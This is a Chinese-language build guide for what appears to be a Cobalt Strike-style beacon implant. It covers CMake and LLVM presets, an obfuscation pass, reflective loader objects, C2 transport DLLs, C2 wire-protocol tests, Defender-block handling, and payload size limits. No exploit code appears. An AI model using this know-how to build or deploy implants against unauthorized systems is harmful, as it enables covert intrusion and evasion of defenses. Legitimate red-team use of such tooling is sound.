# 构建指南

权威入口是 CMake presets（CMake 3.21+）。

## MSVC（默认）

```powershell
cmake --preset default
cmake --build --preset default
ctest --preset default -R host_unit
cmake --install build --config Release --prefix dist
```

`default` 等价于 `cmake -S . -B build -A x64` 后编 Release。CMake 直接编译
`src/`、`udrl/`、`tests/`。

## LLVM（可选）

```bash
bash tools/llvm/setup-host.sh
source ~/.llvm-cross/toolpath.env   # LLVM_CLANG, LLVM_LLD, XWIN_SPLAT
cmake --preset llvm -DBEACON_OBF=ON -DLLVM_DIR="$HOME/.llvm-cross/llvm/lib/cmake/llvm"
cmake --build --preset llvm
```

`llvm` preset：Ninja + `cmake/toolchain-clang-cl-xwin.cmake`。`BEACON_OBF=ON`
时根 CMake 用 `ExternalProject` 在 **host** 工具链下编 `tools/llvm/pass`
（`cmake/toolchain-host.cmake`，不继承 xwin）。layout.h 由 pass-1 DLL 生成，
gargle OBJECT 依赖该头，再链 pass-2 DLL。

CI：`.github/workflows/ci.yml`（msvc + llvm jobs）。

产物在 `build/out/`（MSVC）或 `build-llvm/out/`（LLVM），`cmake --install`
收到 `<prefix>/bin` 与 `<prefix>/lib`：

| 安装路径 | 文件 |
|---|---|
| bin | `beacon.x64.dll` `winhttpb.x64.dll` `dnsb.x64.dll` `extc2.x64.dll` `pivot.x64.dll` |
| bin | `tests.exe` `load_smoke.exe` `host_template_x64.exe` |
| lib | `ReflectiveLoader.x64.obj` `ReflectiveLoader.rwx.x64.obj` |

## 测试

```powershell
ctest --preset default --output-on-failure
.\tests\run_tests.ps1
```

`load_smoke` 是正式 CTest。Defender 以 225/226 拦住 DLL 时进程返回 125，CTest
记为 SKIP；其它 LoadLibrary 失败会使作业失败。

`tests/test_crypto.cpp` 是 C2 加密线缆协议的可执行规格（`docs/WIRE-PROTOCOL.md`）。

精简库验收（手动，需网络）：

```powershell
cmake --preset default
cmake --build --preset default --target trimlib
cmake --preset default -DBEACON_LIB_DIR=thirdparty/out -DBEACON_TEST_EXTRA_DEFS=BEACON_TEST_ENABLE_KEYGEN
cmake --build --preset default --target beacon_tests
ctest --preset default -R host_unit
```

## 工具链

| 项 | 值 |
|---|---|
| Preset `default` | Visual Studio 17 2022, x64, `/MT` |
| Preset `llvm` | Ninja, clang-cl, lld-link, xwin SDK |
| 语言 | C++17，产品 `/GR-`，LTCG 关 |
| 依赖 | IMPORTED `tomcrypt` / `tommath`（`lib/*.x64.lib`） |

x86 库不入库。需要 Win32 套筒时用 `thirdparty/build_trimmed.ps1 -Arch x86`。

## 工程布局

- `CMakeLists.txt` / `cmake/sources.cmake` / `CMakePresets.json` —— 产品定义
- `cmake/toolchain-clang-cl-xwin.cmake` —— LLVM 交叉
- `cmake/toolchain-host.cmake` —— pass 插件 host 编译
- `lib/` —— vendored TomCrypt/TomMath
- `thirdparty/` —— 精简重编配方；目标 `trimlib`
- `.github/workflows/ci.yml` —— 产品 CI

`tools/llvm/manifests/` 与 `layout_two_pass.py` 不是构建入口。

## 体积硬约束

CS stageless 容器 `artifact64big.exe` 把 DLL 写进 `.data`：payload 上限
**271852 B**。超限属于部署侧核对。体积优先走 `thirdparty/` 源码精简。
